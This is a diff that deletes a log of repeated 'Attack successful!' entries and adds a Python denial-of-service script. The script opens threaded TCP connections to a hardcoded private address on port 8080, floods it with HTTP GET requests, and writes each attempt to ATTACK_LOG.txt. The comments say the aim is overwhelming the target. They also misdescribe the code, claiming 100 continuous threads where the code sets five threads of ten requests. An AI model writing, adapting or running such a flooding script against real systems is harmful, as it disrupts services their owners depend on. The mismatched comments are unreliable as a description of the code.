@@ -1,51 +1,63 @@
-2026-05-20 19:03:27 - Thread 1: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 1: Attack successful!
-2026-05-20 19:03:27 - Thread 1: Attack successful!
-2026-05-20 19:03:27 - Thread 0: Attack successful!
-2026-05-20 19:03:27 - Thread 3: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 1: Attack successful!
-2026-05-20 19:03:27 - Thread 0: Attack successful!
-2026-05-20 19:03:27 - Thread 3: Attack successful!
-2026-05-20 19:03:27 - Thread 1: Attack successful!
-2026-05-20 19:03:27 - Thread 0: Attack successful!
-2026-05-20 19:03:27 - Thread 3: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 4: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:27 - Thread 2: Attack successful!
-2026-05-20 19:03:28 - Thread 1: Attack successful!
-2026-05-20 19:03:28 - Thread 3: Attack successful!
-2026-05-20 19:03:28 - Thread 0: Attack successful!
-2026-05-20 19:03:28 - Thread 3: Attack successful!
-2026-05-20 19:03:28 - Thread 3: Attack successful!
-2026-05-20 19:03:28 - Thread 1: Attack successful!
-2026-05-20 19:03:28 - Thread 3: Attack successful!
-2026-05-20 19:03:28 - Thread 0: Attack successful!
-2026-05-20 19:03:28 - Thread 1: Attack successful!
-2026-05-20 19:03:28 - Thread 0: Attack successful!
-2026-05-20 19:03:28 - Thread 1: Attack successful!
-2026-05-20 19:03:28 - Thread 1: Attack successful!
-2026-05-20 19:03:28 - Thread 3: Attack successful!
-2026-05-20 19:03:28 - Thread 0: Attack successful!
-2026-05-20 19:03:28 - Thread 0: Attack successful!
-2026-05-20 19:03:28 - Thread 0: Attack successful!
-2026-05-20 19:03:28 - Thread 3: Attack successful!
-2026-05-20 19:03:28 - Thread 0: Attack successful!
-2026-05-20 19:03:28 - Thread 3: Attack successful!
-2026-05-20 19:03:28 - Attack completed.
+
+
+
+
+'''python
+from asyncio import threads
+import socket
+import threading
+import struct  
+from datetime import datetime  
+
+
+# define the target IP address and port 
+ip_target = "192.168.74.131"
+target_port = 8080
+
+thread_count = 5
+request_count = 10
+
+# log file setup
+FILE_LOG = 'ATTACK_LOG.txt'
+LOG_LOCK = threading.Lock()
+def write_log(message):
+    """
+    Writes a log message to the log file with a timestamp.
+    Args:
+        message (str): The log message to write.
+    """
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with LOG_LOCK:
+        with open(FILE_LOG, 'a') as f:
+            f.write(f"{timestamp} - {message}\n")
+
+# function to perform the attack
+def attack(thread_id):
+    for _ in range(request_count):
+        # create a socket object
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET is for IPv4 and SOCK_STREAM is for TCP
+        s.settimeout(5)  # set a timeout for the socket operations to prevent hanging indefinitely
+        try:
+            # connect to the target
+            s.connect((ip_target, target_port))
+            # send a large number of requests to the target , this is the line that actually sends the attack to the target IP address and port. It constructs a simple HTTP GET request and sends it to the target using the socket connection. The request includes the target IP address in the Host header, which is a standard part of an HTTP request.
+            s.sendto(b"GET / HTTP/1.1\r\nHost: " + ip_target.encode() + b"\r\n\r\n", (ip_target, target_port)) # this sends a simple HTTP GET request to the target IP address and port
+            write_log(f"Thread {thread_id}: Attack successful!")
+        except Exception as e:
+            write_log(f"Thread {thread_id}: Attack failed: {e}")
+        finally:
+            s.close()   
+
+threads = []
+# create multiple threads to perform the attack
+# this will create 100 threads that will continuously perform the attack function, which will send a large number of requests to the target IP address and port, potentially overwhelming the target and causing a denial of service (DoS) attack.
+for i in range(thread_count):
+    thread = threading.Thread(target=attack, args=(i,))
+    threads.append(thread)
+    thread.start()
+for thread in threads:
+    thread.join()
+write_log("Attack completed.")
+print("Attack completed. Check ATTACK_LOG.txt for details.")
+
+'''
